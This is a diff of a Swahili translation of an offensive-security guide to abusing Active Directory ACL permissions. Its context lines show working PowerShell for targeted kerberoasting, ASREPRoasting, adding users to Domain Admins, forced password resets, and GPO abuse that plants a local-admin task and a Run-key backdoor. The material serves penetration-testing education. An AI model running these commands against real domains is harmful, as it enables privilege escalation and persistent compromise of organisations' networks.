@@ -15,20 +15,20 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asilia.**
+**This page is mostly a summary of the techniques from** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **and** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. For more details, check the original articles.**
 
 ## **GenericAll Rights on User**
 
 Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji wa lengo. Mara haki za `GenericAll` zinapothibitishwa kwa kutumia amri `Get-ObjectAcl`, mshambuliaji anaweza:
 
-* **Kubadilisha Nywila ya Lengo**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kurekebisha nywila ya mtumiaji.
-* **Kerberoasting ya Lengo**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iweze kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja tiketi ya kutoa tiketi (TGT) hashes.
+* **Badilisha Nywila ya Lengo**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kurekebisha nywila ya mtumiaji.
+* **Kerberoasting ya Lengo**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iweze kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja hash za tiketi ya kutoa tiketi (TGT).
 ```powershell
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-* **Targeted ASREPRoasting**: Zima pre-authentication kwa mtumiaji, na kufanya akaunti yao kuwa hatarini kwa ASREPRoasting.
+* **Targeted ASREPRoasting**: Zima uthibitisho wa awali kwa mtumiaji, na kufanya akaunti yao kuwa hatarini kwa ASREPRoasting.
 ```powershell
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
@@ -44,16 +44,16 @@ Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.
 ```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Kuwa na haki hizi kwenye kitu cha kompyuta au akaunti ya mtumiaji inaruhusu:
+Kuwa na haki hizi kwenye kituo cha kompyuta au akaunti ya mtumiaji inaruhusu:
 
-* **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kitu cha kompyuta.
-* **Shadow Credentials**: Tumia mbinu hii kuiga kompyuta au akaunti ya mtumiaji kwa kutumia haki za kuunda akiba ya sifa.
+* **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kituo cha kompyuta.
+* **Shadow Credentials**: Tumia mbinu hii kuiga akaunti ya kompyuta au mtumiaji kwa kutumia haki za kuunda akiba za kivuli.
 
 ## **WriteProperty on Group**
 
 Ikiwa mtumiaji ana haki za `WriteProperty` kwenye vitu vyote kwa kundi maalum (mfano, `Domain Admins`), wanaweza:
 
-* **Kujiongeza Kwenye Kundi la Domain Admins**: Inaweza kufanywa kwa kuunganisha amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kupandishwa vyeo ndani ya eneo.
+* **Kujiongeza Kwenye Kundi la Domain Admins**: Inaweza kufanywa kwa kuunganisha amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kupandisha hadhi ndani ya eneo.
 ```powershell
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
@@ -65,14 +65,14 @@ net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domai
 ```
 ## **WriteProperty (Self-Membership)**
 
-Privilege hii inayofanana, inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
+Haki inayofanana, hii inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
 ```powershell
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu mabadiliko ya nywila bila kujua nywila ya sasa. Uthibitishaji wa haki hii na matumizi yake yanaweza kufanywa kupitia PowerShell au zana nyingine za amri, zikitoa njia kadhaa za kurekebisha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri zinatofautiana kutoka kwa mwito rahisi wa PowerShell hadi kutumia `rpcclient` kwenye Linux, ikionyesha ufanisi wa njia za shambulio.
+Kushikilia `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu mabadiliko ya nywila bila kujua nywila ya sasa. Uthibitishaji wa haki hii na matumizi yake yanaweza kufanywa kupitia PowerShell au zana nyingine za amri, zikitoa mbinu kadhaa za kurekebisha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri zinatofautiana kutoka kwa mwito rahisi wa PowerShell hadi kutumia `rpcclient` kwenye Linux, ikionyesha ufanisi wa njia za shambulio.
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -99,7 +99,7 @@ Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\
 ```
 ## **GenericWrite on Group**
 
-Kwa ruhusa hii, washambuliaji wanaweza kubadilisha uanachama wa kikundi, kama kuongeza wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kuunda kitu cha akiba, kukitumia kuongeza au kuondoa watumiaji kutoka kwa kikundi, na kuthibitisha mabadiliko ya uanachama kwa amri za PowerShell.
+Kwa ruhusa hii, washambuliaji wanaweza kubadilisha uanachama wa kikundi, kama kuongeza wenyewe au watumiaji wengine kwenye vikundi maalum. Mchakato huu unahusisha kuunda kitu cha akidi, kukitumia kuongeza au kuondoa watumiaji kutoka kwa kikundi, na kuthibitisha mabadiliko ya uanachama kwa amri za PowerShell.
 ```powershell
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -119,33 +119,33 @@ $ADSI.psbase.commitchanges()
 ```
 ## **Replication on the Domain (DCSync)**
 
-Shambulio la DCSync linatumia ruhusa maalum za kuiga kwenye eneo ili kuiga Kituo cha Kikoa na kusawazisha data, ikiwa ni pamoja na akidi za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ikiruhusu washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila ufikiaji wa moja kwa moja kwa Kituo cha Kikoa. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)
+Shambulio la DCSync linatumia ruhusa maalum za kuiga kwenye kanda ili kuiga Kituo cha Kanda na kusawazisha data, ikiwa ni pamoja na akidi za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ikiruhusu washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila kupata moja kwa moja kwenye Kituo cha Kanda. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)
 
 ## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
 
 ### GPO Delegation
 
-Ufikiaji wa delegated wa kusimamia Vitu vya Sera za Kundi (GPOs) unaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumika vibaya kwa madhumuni maovu, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Ruhusa iliyotolewa ya kusimamia Vitu vya Sera za Kundi (GPOs) inaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumika vibaya kwa madhumuni mabaya, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### Enumerate GPO Permissions
 
-Ili kubaini GPO zilizo na mipangilio isiyo sahihi, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPO ambazo mtumiaji maalum ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Ili kubaini GPOs zilizo na mipangilio isiyo sahihi, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPOs ambazo mtumiaji maalum ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Kompyuta zenye Sera Iliyotumika**: Inawezekana kutambua ni kompyuta zipi GPO maalum inatumika, kusaidia kuelewa upeo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Kompyuta zenye Sera Iliyotumika**: Inawezekana kubaini ni kompyuta zipi GPO maalum inatumika, kusaidia kuelewa upeo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
 **Sera Zilizotumika kwa Kompyuta Maalum**: Ili kuona ni sera zipi zimewekwa kwa kompyuta fulani, amri kama `Get-DomainGPO` zinaweza kutumika.
 
-**OUs zenye Sera Iliyotumika**: Kutambua vitengo vya shirika (OUs) vilivyoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.
+**OUs zenye Sera Iliyotumika**: Kubaini vitengo vya shirika (OUs) vilivyoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.
 
 ### Abuse GPO - New-GPOImmediateTask
 
-GPO zilizo na mipangilio isiyo sahihi zinaweza kutumika vibaya kutekeleza msimbo, kwa mfano, kwa kuunda kazi ya ratiba ya haraka. Hii inaweza kufanywa kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, ikiongeza sana ruhusa:
+GPOs zilizo na mipangilio isiyo sahihi zinaweza kutumika vibaya ili kutekeleza msimbo, kwa mfano, kwa kuunda kazi ya ratiba ya papo hapo. Hii inaweza kufanywa kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, ikiongeza sana ruhusa:
 ```powershell
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
 ### GroupPolicy module - Abuse GPO
 
-Moduli ya GroupPolicy, ikiwa imewekwa, inaruhusu uundaji na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za rejista ili kutekeleza backdoors kwenye kompyuta zilizoathirika. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta kwa ajili ya utekelezaji:
+Moduli ya GroupPolicy, ikiwa imewekwa, inaruhusu uundaji na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za rejista kutekeleza backdoors kwenye kompyuta zilizoathirika. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta kwa ajili ya utekelezaji:
 ```powershell
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
